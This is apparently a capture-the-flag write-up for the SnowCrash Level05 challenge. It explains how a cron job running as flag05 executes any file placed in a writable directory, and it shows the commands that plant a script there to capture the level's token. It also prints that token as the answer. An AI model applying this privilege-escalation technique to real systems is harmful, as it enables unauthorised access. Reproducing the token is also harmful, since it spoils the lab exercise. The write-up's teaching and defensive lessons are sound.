# Level05 - Cron Job Exploitation

## Challenge Overview

Level05 involves discovering and exploiting a scheduled task (cron job) that runs with elevated privileges. The challenge teaches about:

- Identifying system messages and notifications
- Discovering cron jobs through system inspection
- Understanding file permissions and privilege escalation
- Exploiting insecure script execution paths

## Initial Reconnaissance

When logging in as level05, you might notice a system message:

```
You have new mail.
```

This is our first clue - there's something important in the mail spool.

## Investigation

### Step 1: Check the mail

In Linux systems, the mail system is a simple text-based messaging service that allows users and system processes to communicate. System mail is often used by:

- Cron jobs to report errors or output
- System administrators to notify users
- System services to report critical information

Each user's mail is typically stored in a file at `/var/mail/username` or `/var/spool/mail/username`. When you see a "You have new mail" message, it's worth investigating as it often contains important system information.

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This reveals a cron job that runs every 2 minutes as the flag05 user, executing `/usr/sbin/openarenaserver`.

#### The Cron Schedule (First 5 Fields)

- First position (_/2): Runs every 2 minutes (_/2 means "every 2" in the minute position)
- Second position (\*): Every hour
- Third position (\*): Every day of month
- Fourth position (\*): Every month
- Fifth position (\*): Every day of week

  So this translates to: "Run every 2 minutes, 24/7"

#### The Command Part

- su: Switch user command
- -c: Option that means "execute the following command"
- "sh /usr/sbin/openarenaserver": The command to execute (runs the script using sh)
- -: Provides a clean environment for the new user session
- flag05: The user to switch to when running the command

### Step 2: Examine the script

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

The script:

- Uses a `for` loop to iterate through all files in `/opt/openarenaserver/`
- For each file found:
  - Sets a CPU time limit of 5 seconds (`ulimit -t 5`)
  - Executes the file with bash in debug mode (`bash -x`)
  - Deletes the file after execution (`rm -f`)
- The script runs with flag05's permissions due to the cron job

## Vulnerability Analysis

The vulnerability lies in the script executing any file placed in `/opt/openarenaserver/` with flag05's permissions.

## Exploitation Strategy

1. Create a script in the target directory that executes `getflag`
2. Make it executable
3. Wait for the cron job to run it (within 2 minutes)
4. The result will be captured for later viewing

## Exploitation Steps

### Step 1: Create a script that captures the flag

```bash
$ echo '#!/bin/sh' > /opt/openarenaserver/exploit.sh
$ echo 'getflag > /tmp/flag05' >> /opt/openarenaserver/exploit.sh
$ chmod +x /opt/openarenaserver/exploit.sh
```

### Step 2: Wait for execution

Wait up to 2 minutes for the cron job to execute our script.

### Step 3: Retrieve the captured output

```bash
$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Security Lessons

1. **Principle of Least Privilege**: Cron jobs should run with the minimum privileges needed.

2. **Secure Script Paths**: Scripts that run with elevated privileges should be in secure locations not writable by lower-privileged users.

3. **Input Validation**: The `for` loop in the script executes any file without validation, creating a security risk.

4. **Regular Security Audits**: Cron jobs should be regularly audited for security issues.

## Summary

This challenge demonstrates a common privilege escalation vector through insecure cron job configuration. By abusing a script that automatically executes user-created files, we were able to escalate to flag05's privileges and capture the token.

The flag for level05 is: `viuaaale9huek52boumoomioc`
